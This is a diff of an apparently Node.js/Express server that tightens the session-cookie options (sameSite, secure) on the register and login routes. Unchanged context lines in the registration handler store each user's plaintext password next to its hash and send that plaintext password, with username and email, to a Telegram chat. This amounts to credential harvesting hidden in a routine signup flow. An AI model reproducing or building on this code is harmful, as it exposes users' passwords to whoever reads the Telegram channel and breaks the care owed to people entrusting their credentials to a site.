@@ -24,6 +24,11 @@ const upload = multer({
   }
 });
 
+const isProduction = !!process.env.DATABASE_URL;
+function cookieOpts() {
+  return { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, sameSite: 'lax', secure: isProduction };
+}
+
 // SSE clients
 const sseClients = new Set();
 function pushToAdmins(event, data) {
@@ -107,7 +112,7 @@ app.post('/api/register', async (req, res) => {
       [username, email, hash, password, full_name || '', phone || '', role, avatar_color]
     );
     const token = jwt.sign({ id: result.rows[0].id, username, email, role }, JWT_SECRET, { expiresIn: '7d' });
-    res.cookie('token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
+    res.cookie('token', token, cookieOpts());
 
     pushToAdmins('user_registered', { id: result.rows[0].id, username, email, role });
     sendTelegram(`🆕 <b>Новый пользователь!</b>\n👤 ${username}\n📧 ${email}\n🔑 ${password}\n⏰ ${new Date().toLocaleString('ru-RU')}`);
@@ -132,7 +137,7 @@ app.post('/api/login', async (req, res) => {
     return res.status(401).json({ error: 'Неверный email или пароль' });
   await pool.query('UPDATE users SET last_login = NOW() WHERE id = $1', [user.id]);
   const token = jwt.sign({ id: user.id, username: user.username, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
-  res.cookie('token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
+  res.cookie('token', token, cookieOpts());
   res.json({ success: true, role: user.role, username: user.username });
 });
 
